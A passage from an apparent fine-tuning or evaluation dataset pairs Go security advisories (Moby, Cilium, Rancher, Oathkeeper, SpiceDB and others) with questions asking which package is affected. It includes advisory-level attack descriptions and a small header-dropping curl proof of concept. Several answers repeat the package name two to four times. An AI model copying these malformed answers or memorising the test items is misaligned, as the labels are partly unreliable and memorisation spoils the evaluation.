GetKeyspaces` will also return an error.\nNote that all other keyspaces can still be administered using the CLI (vtctldclient).\n\n### Patches\nv16.0.1 (corresponding to 0.16.1 on pkg.go.dev)\n\n### Workarounds\nDelete the offending keyspace using a CLI client (vtctldclient) \n```\nvtctldclient --server ... DeleteKeyspace a/b\n```\n\nFound during a security audit sponsored by the [CNCF](https://cncf.io) and facilitated by [OSTIF](https://ostif.org).. Top 1 search result is go:github.com/ThomasLeister/prosody-filer. What is the affected package?"}, {"from": "gpt", "value": "The affected package is vitess.io/vitess."}]}, {"id": "GHSA-232p-vwff-86mp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: [Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\n[Two iptables rules](https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L230-L234) serve to filter incoming VXLAN datagrams with a VNI that corresponds to an encrypted network and discards unencrypted datagrams. The rules are appended to the end of the `INPUT` filter chain, following any rules that have been previously set by the system administrator. Administrator-set rules take precedence over the rules Moby sets to discard unencrypted VXLAN datagrams, which can potentially admit unencrypted datagrams that should have been discarded.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThese rules are not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected configurations silently accept cleartext VXLAN datagrams that are tagged with the VNI of an encrypted overlay network. As a result, it is possible to inject arbitrary Ethernet frames into the encrypted overlay network by encapsulating them in VXLAN datagrams.\n\nThe injection of arbitrary Ethernet frames can enable a Denial of Service attack. A sophisticated attacker may be able to establish a UDP or TCP connection by way of the container\u2019s outbound gateway that would otherwise be blocked by a stateful firewall, or carry out other escalations beyond simple injection by smuggling packets into the overlay network.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* Close the VXLAN port (by default, UDP port 4789) to incoming traffic at the Internet boundary (see [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)) to prevent all VXLAN packet injection.\n* Ensure that the `xt_u32` kernel module is available on all nodes of the Swarm cluster.\n\n## Background\n* [#43382](https://github.com/moby/moby/issues/43382) partially discussed this concern, but did not consider the security implications.\n* Mirantis FIELD-5788 essentially duplicates [#43382](https://github.com/moby/moby/issues/43382), and was created six months earlier; it similarly overlooked the security implications.\n* [#45118](https://github.com/moby/moby/pull/45118) is the ancestor of the final patches, and was where the security implications were discovered.\n\n## Related\n* [CVE-2023-28841: Encrypted overlay network traffic may be unencrypted](https://github.com/moby/moby/security/advisories/GHSA-33pg-m6jh-5237)\n* [CVE-2023-28842: Encrypted overlay network with a single endpoint is unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork). Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/docker/docker github.com/docker/docker."}]}, {"id": "GHSA-939c-3g97-vpvv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: blackbox_exporter v0.23.0 was discovered to contain an access control issue in its probe interface. This vulnerability allows attackers to detect intranet ports and services, as well as download resources.. Top 1 search result is go:github.com/tidwall/gjson. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/prometheus/blackbox_exporter."}]}, {"id": "GHSA-w9mr-28mw-j8hg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nDownstream services relying on the presence of headers set by the `header` mutator could be exploited. A client can drop the header set by the `header` mutator by including that header's name in the `Connection` header. Example minimal config:\n\n```yaml\n- id: 'example'\n  upstream:\n    url: 'https://example.com'\n  match:\n    url: 'http://127.0.0.1:4455/'\n    methods:\n      - GET\n  authenticators:\n    - handler: anonymous\n  authorizer:\n    handler: allow\n  mutators:\n    - handler: header\n      config:\n        headers:\n          X-Subject: {{ .Subject }}\n```\n\n```\ncurl -H \"Connection: close,x-subject\" http://127.0.0.1:4455/\n```\n\nThe `X-Subject` header will not arrive at the downstream server. It is completely dropped. In case the downstream server handles such a request in an unexpected way, an attacker can exploit this, assuming they know or guess the internal header name.\n\n### Patches\n\nc5cc7f736dc84185034be4356057d1c7a656d797\n\n### Workarounds\n\nThe downstream server should handle the case that an expected header is not set by responding with an appropriate error.\n\n### References\n\nSee background info in https://github.com/golang/go/issues/50580. Top 1 search result is go:github.com/Kava-Labs/kava. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/ory/oathkeeper."}]}, {"id": "GHSA-f8r8-h93m-mj77", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Nomad and Nomad Enterprise versions 1.5.0 up to 1.5.2 allow unauthenticated users to bypass intended ACL authorizations for clusters where mTLS is not enabled. This issue is fixed in version 1.5.3.. Top 1 search result is go:github.com/MichaelMure/git-bug. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/nomad."}]}, {"id": "GHSA-f6xp-59jq-r35c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross Site Request Forgery vulnerability found in Phachon mm-wiki v.0.1.2 allows a remote attacker to execute arbitrary code via the system/user/save parameter.. Top 1 search result is go:github.com/supranational/blst. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/phachon/mm-wiki."}]}, {"id": "GHSA-cjr9-mr35-7xh6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Background\n\nThe `spicedb serve` command contains a flag named `--grpc-preshared-key` which is used to protect the gRPC API from being accessed by unauthorized requests. The values of this flag are to be considered sensitive, secret data.\n\nThe `/debug/pprof/cmdline` endpoint served by the metrics service (defaulting running on port `9090`) reveals the command-line flags provided for debugging purposes. If a password is set via the `--grpc-preshared-key` then the key is revealed by this endpoint along with any other flags provided to the SpiceDB binary.\n\n### Impact\n\nAll deployments abiding by the recommended best practices for production usage are **NOT affected**:\n- Authzed's SpiceDB Serverless\n- Authzed's SpiceDB Dedicated\n- SpiceDB Operator\n\nUsers configuring SpiceDB via environment variables are **NOT affected**.\n\nUsers **MAY be affected** if they expose their metrics port to an untrusted network and are configuring `--grpc-preshared-key` via command-line flag.\n\n### Workarounds\n\nTo workaround this issue you can do one of the following:\n\n- Configure the preshared key via an environment variable (e.g. `SPICEDB_GRPC_PRESHARED_KEY=yoursecret spicedb serve`)\n- Reconfigure the `--metrics-addr` flag to bind to a trusted network (e.g. `--metrics-addr=localhost:9090`)\n- Disable the metrics service via the flag (e.g. `--metrics-enabled=false`)\n- Adopt one of the recommended deployment models: [Authzed's managed services](https://authzed.com/pricing) or the [SpiceDB Operator](https://github.com/authzed/spicedb-operator)\n\n### References\n\n- [GitHub Security Advisory issued for SpiceDB](https://github.com/authzed/spicedb/security/advisories/GHSA-cjr9-mr35-7xh6)\n- [Go issue #22085](https://github.com/golang/go/issues/22085) for documenting the risks of exposing pprof to the internet\n- [Go issue #42834](https://github.com/golang/go/issues/42834) discusses preventing pprof registration to the default serve mux\n- [semgrep rule go.lang.security.audit.net.pprof.pprof-debug-exposure](https://semgrep.dev/r?q=go.lang.security.audit.net.pprof) checks for a variation of this issue. Top 1 search result is go:github.com/lightningnetwork/lnd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/authzed/spicedb."}]}, {"id": "GHSA-7hj9-rv74-5g92", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThere is a vulnerability in [Go when parsing the HTTP headers](https://groups.google.com/g/golang-announce/c/Xdv6JL9ENs8/m/OV40vnafAwAJ), which impacts Traefik.\nHTTP header parsing could allocate substantially more memory than required to hold the parsed headers. This behavior could be exploited to cause a denial of service.\n\n### References\n\n- [CVE-2023-24534](https://www.cve.org/CVERecord?id=CVE-2023-24534)\n\n### Patches\n- https://github.com/traefik/traefik/releases/tag/v2.9.10\n- https://github.com/traefik/traefik/releases/tag/v2.10.0-rc2\n\n### Workarounds\n\nNo workaround.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n. Top 1 search result is go:github.com/russellhaering/goxmldsig. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/traefik/traefik/v2 github.com/traefik/traefik/v2."}]}, {"id": "GHSA-cwf6-xj49-wp83", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nOn a node controlled by an attacker or malicious user, the lax permissions configured on `open-feature-operator-controller-manager` can be used to further escalate the privileges of any service account in the cluster.\n\nThe increased privileges could be used to modify cluster state, leading to DoS, or read sensitive data, including secrets.\n\n### Patches\n\nThe patch mitigates this issue by restricting the resources the `open-feature-operator-controller-manager` can modify.. Top 1 search result is go:github.com/unknwon/cae. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/open-feature/open-feature-operator."}]}, {"id": "GHSA-j97g-77fj-9c4p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.6 is vulnerable to account takeover because the password reset link does not expire.. Top 1 search result is go:k8s.io/kube-state-metrics. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-33pg-m6jh-5237", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: [Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nAn [iptables rule](https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L205-L207) designates outgoing VXLAN datagrams with a VNI that corresponds to an encrypted overlay network for IPsec encapsulation.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThis rule is not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected platforms silently transmit unencrypted data. As a result, `overlay` networks may appear to be functional, passing traffic as expected, but without any of the expected confidentiality or data integrity guarantees.\n\nIt is possible for an attacker sitting in a trusted position on the network to read all of the application traffic that is moving across the overlay network, resulting in unexpected secrets or user data disclosure. Thus, because many database protocols, internal APIs, etc. are not protected by a second layer of encryption, a user may rely on Swarm encrypted overlay networks to provide confidentiality, which due to this vulnerability is no longer guaranteed.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* Close the VXLAN port (by default, UDP port 4789) to outgoing traffic at the Internet boundary (see [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)) in order to prevent unintentionally leaking unencrypted traffic over the Internet.\n* Ensure that the `xt_u32` kernel module is available on all nodes of the Swarm cluster.\n\n## Background\n* [#43382 ](https://github.com/moby/moby/issues/43382)partially discussed this concern, but did not consider the security implications.\n* Mirantis FIELD-5788 essentially duplicates [#43382](https://github.com/moby/moby/issues/43382), and was created six months earlier; it similarly overlooked the security implications.\n* [#45118](https://github.com/moby/moby/pull/45118) is the ancestor of the final patches, and was where the security implications were discovered.\n\n## Related\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [CVE-2023-28842: Encrypted overlay network with a single endpoint is unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork). Top 1 search result is go:github.com/square/go-jose. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/docker/docker github.com/docker/docker."}]}, {"id": "GHSA-gmph-wf7j-9gcm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Authentication vulnerability found in Etcd-io v.3.4.10 allows remote attackers to escalate privileges via the debug function.\n\nThis has been fixed in v.[3.5.8](https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.5.md#etcd-server) and was also backported to [3.4](https://github.com/etcd-io/etcd/pull/15655) and [3.5](https://github.com/etcd-io/etcd/pull/15653).. Top 1 search result is go:github.com/tendermint/tendermint. What is the affected package?"}, {"from": "gpt", "value": "The affected package is go.etcd.io/etcd/v3."}]}, {"id": "GHSA-pg5p-wwp8-97g8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nWhen run in debug mode, Cilium may log sensitive information.\n\nIn particular, Cilium running in debug mode will log the values of headers if they match HTTP network policy rules. This issue affects Cilium versions:\n\n- 1.7.* to 1.10.* inclusive\n- 1.11.* before 1.11.16\n- 1.12.* before 1.12.9\n- 1.13.* before 1.13.2\n\nIn addition, Cilium 1.12.* before 1.12.9 and 1.13.* before 1.13.2., when running in debug mode, might log secrets used by the Cilium agent. This includes TLS private keys for Ingress and GatewayAPI resources, depending on the configuration of the affected cluster. Output of the confidential data would occur at Cilium agent restart, when the secrets are modified, and on creation of Ingress or GatewayAPI resources.\n\n### Patches\n\nThis vulnerability is fixed in Cilium releases 1.11.16, 1.12.9, and 1.13.2.\n\n### Workarounds\nDisable debug mode.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @meyskens for investigating and fixing the issue.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n. Top 1 search result is go:github.com/goharbor/harbor. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-833c-xh79-p429", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Summary:\nA potential risk in clusternet which can be leveraged to make a cluster-level privilege escalation.\n## Detailed analysis:\nThe clusternet has a deployment called cluster-hub inside the clusternet-system Kubernetes namespace, which runs on worker nodes\nrandomly. The deployment has a service account called clusternet-hub, which has a cluster role called clusternet:hub via cluster role binding. The clusternet:hub cluster role has \"*\" verbs of \"*.*\" resources. Thus, if a malicious user can access the worker node which runs the clusternet, he/she can leverage the service account to do malicious actions to critical system resources. For example, he/she can leverage the service account to get ALL secrets in the entire cluster, resulting in cluster-level privilege escalation.. Top 1 search result is go:github.com/nats-io/nats-server. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/clusternet/clusternet."}]}, {"id": "GHSA-65v8-6pvw-jwvq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.8 does not strip EXIF geolocation data from user-uploaded logos. As a result, anyone can get sensitive information like a user's device ID, geolocation, system information, system version, etc.. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-f7rp-xx67-4pj9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Phachon mm-wiki v.0.1.2 vulnerable to stored cross-site scripting (XSS). This could allow a remote attacker to execute arbitrary code via JavaScript code in the markdown editor. Any user browsing the document containing XSS malicious code will trigger the vulnerability.. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/phachon/mm-wiki."}]}, {"id": "GHSA-6m9f-pj6w-w87g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nA failure in the update logic of Rancher's admission Webhook may lead to the misconfiguration of the Webhook. This component enforces validation rules and security checks before resources are admitted into the Kubernetes cluster.\n\nWhen the Webhook is operating in a degraded state, it no longer validates any resources, which may result in severe privilege escalations and data corruption.\n\nThe issue only affects users that upgrade from `2.6.x` or `2.7.x` to `2.7.2`. Users that did a fresh install of 2.7.2 (and did not follow an upgrade path) are not affected.\n\nThe command below can be executed on the `local` cluster to determine whether the cluster is affected by this issue:\n\n```sh\n$ kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io\n\nNAME                WEBHOOKS   AGE\nrancher.cattle.io   0         19h\n```\n\nIf the resulting webhook quantity is `0`, the Rancher instance is affected.\n\n### Patches\n\nPatched versions include release `2.7.3` and later versions.\n\n### Workarounds\n\nIf you are affected and cannot update to a patched Rancher version, the recommended workaround is to manually reconfigure the Webhook with the script below. Please note that the script must be run from inside the `local` cluster or with a kubeconfig pointing to the `local` cluster which has admin permissions.\n\n```yaml\n#!/bin/bash\n\nset -euo pipefail\n\nfunction prereqs() {\n    if ! [ -x \"$(command -v kubectl)\" ]; then\n      echo \"error: kubectl is not installed.\" >&2\n      exit 1\n    fi\n\n    if [[ -z \"$(kubectl config view -o jsonpath='{.clusters[].cluster.server}')\" ]]; then\n        echo \"error: No kubernetes cluster found on kubeconfig.\" >&2\n        exit 1\n    fi\n}\n\nfunction restart_deployment(){\n    kubectl rollout restart deployment rancher-webhook -n cattle-system\n    kubectl rollout status deployment rancher-webhook -n cattle-system --timeout=30s\n}\n\nfunction workaround() {\n    echo \"Cluster: $(kubectl config view -o jsonpath='{.clusters[].cluster.server}')\"\n\n    if ! kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io > /dev/null 2>&1; then\n        echo \"webhook rancher.cattle.io not found, restarting deployment:\"\n        restart_deployment\n\n        echo \"waiting for webhook configuration\"\n        sleep 15s\n    fi\n\n    local -i webhooks\n    webhooks=\"$(kubectl get validatingwebhookconfigurations.admissionregistration.k8s.io rancher.cattle.io --no-headers | awk '{ print $2 }')\"\n\n    if [ \"${webhooks}\" == \"0\" ]; then\n        echo \"Webhook misconfiguration status: Cluster is affected by CVE-2023-22651\"\n        \n        echo \"Running workaround:\"\n        kubectl delete validatingwebhookconfiguration rancher.cattle.io\n        restart_deployment\n\n        ret=$?\n        if [ $ret -eq 0 ]; then\n            echo \"Webhook restored, CVE-2023-22651 is fixed\"\n        else\n            echo \"error trying to restart deployment. try again in a few seconds.\"\n        fi\n    else\n        echo \"Webhook misconfiguration status: not present (skipping)\"\n    fi\n\n    echo \"Done\"\n}\n\nfunction main() {\n    prereqs\n    workaround\n}\n\nmain\n```\n\n### References\n- https://github.com/rancher/webhook/pull/216/commits/a4a498613b43a3ee93c5ab06742a3bc8adace45d\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n- Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n- Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).. Top 1 search result is go:github.com/containers/psgo/internal/proc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/rancher/rancher."}]}, {"id": "GHSA-8jg3-rx43-3fv4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: answerdev/answer is an open-source knowledge-based community software. Answer prior to 1.0.8 may expose sensitive information, such as EXIF data and GPS coordatinates, via image metadata.. Top 1 search result is go:github.com/nats-io/jwt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-9337-8c6c-c2xg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: CubeFS through 3.2.1 allows Kubernetes cluster-level privilege escalation. This occurs because DaemonSet has cfs-csi-cluster-role and can thus list all secrets, including the admin secret.. Top 1 search result is go:github.com/lima-vm/lima. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cubefs/cubefs."}]}, {"id": "GHSA-2394-5535-8j88", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Users authorized to list or watch one type of namespaced custom resource cluster-wide can read custom resources of a different type in the same API group without authorization. Clusters are impacted by this vulnerability if all of the following are true: 1. There are 2+ CustomResourceDefinitions sharing the same API group 2. Users have cluster-wide list or watch authorization on one of those custom resources. 3. The same users are not authorized to read another custom resource in the same API group.. Top 1 search result is go:github.com/kubernetes/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kubernetes/kubernetes github.com/kubernetes/kubernetes github.com/kubernetes/kubernetes github.com/kubernetes/kubernetes."}]}, {"id": "GHSA-6w5f-5wgr-qjg5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn active attacker could let the boot fail on purpose in the initramfs, dropping the serial console into an emergency shell. This gives attackers with access to the serial console full control over the VM.\n\n### Patches\n\nThe issue has been patched in [v2.6.0](https://github.com/edgelesssys/constellation/releases/tag/v2.6.0).\n\n### Workarounds\n\nnone\n\n. Top 1 search result is go:github.com/dgrijalva/jwt-go. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/edgelesssys/constellation/v2."}]}, {"id": "GHSA-4hc4-pgfx-3mrx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn attacker with access to a Cilium agent pod can write to `/opt/cni/bin` due to a `hostPath` mount of that directory in the agent pod. By replacing the CNI binary with their own malicious binary and waiting for the creation of a new pod on the node, the attacker can gain access to the underlying node. \n\n### Patches\n\nThe issue has been fixed and is available on versions >=1.11.15, >=1.12.8, >=1.13.1.\n\n### Workarounds\n\n[Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) should be used to deny users and service accounts `exec` access to Cilium agent pods.\n\nIn cases where a user requires `exec` access to Cilium agent pods, but should not have access to the underlying node, no workaround is possible.\n\n### References\n\n* [PR containing resolution](https://github.com/cilium/cilium/pull/24075)\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent and Form3 to prepare these mitigations. Special thanks to Anastasios Koutlis, Daniel Teixeira, and Magdalena Oczadly for their cooperation. \n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: security@cilium.io - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority. . Top 1 search result is go:github.com/oauth2-proxy/oauth2-proxy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-9f95-hhg4-pg4f", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Description\n\nteler-waf is a Go HTTP middleware that provides teler IDS functionality to protect against web-based attacks. Versions prior to v0.1.1 are vulnerable to bypassing common web attack rules when a specific HTML entities payload is used. This vulnerability allows an attacker to execute arbitrary JavaScript code on the victim's browser and compromise the security of the web application. The vulnerability exists due to teler-waf failure to properly sanitize and filter HTML entities in user input.\n\n### Impact\n\nAn attacker can exploit this vulnerability to bypass common web attack threat rules in teler-waf and launch cross-site scripting (XSS) attacks. The attacker can execute arbitrary JavaScript code on the victim's browser and steal sensitive information, such as login credentials and session tokens, or take control of the victim's browser and perform malicious actions.\n\n### Patches\n\nVersion [v0.1.1](https://github.com/kitabisa/teler-waf/releases/tag/v0.1.1) includes a patch for this vulnerability.\n\n### Workarounds\n\nWe advised updating their installations to version `v0.1.1` and frontwards immediately.. Top 1 search result is go:github.com/go-ldap/ldap. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kitabisa/teler-waf."}]}, {"id": "GHSA-5mqj-xc49-246p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Our use of flate.NewReader does not limit the size of the input. The user could pass more than 1 MB of data in the HTTP request to the processing functions, which will be decompressed server-side using the Deflate algorithm. Therefore, after repeating the same request multiple times, it is possible to achieve a reliable crash since the operating system kills the process.\n. Top 1 search result is go:github.com/miekg/dns. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/crewjam/saml."}]}, {"id": "GHSA-pmhg-cmjc-3875", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: api/auth.go in Ansible Semaphore before 2.8.89 mishandles authentication.. Top 1 search result is go:github.com/sylabs/sif. What is the affected package?"}, {"from": "gpt", "value": 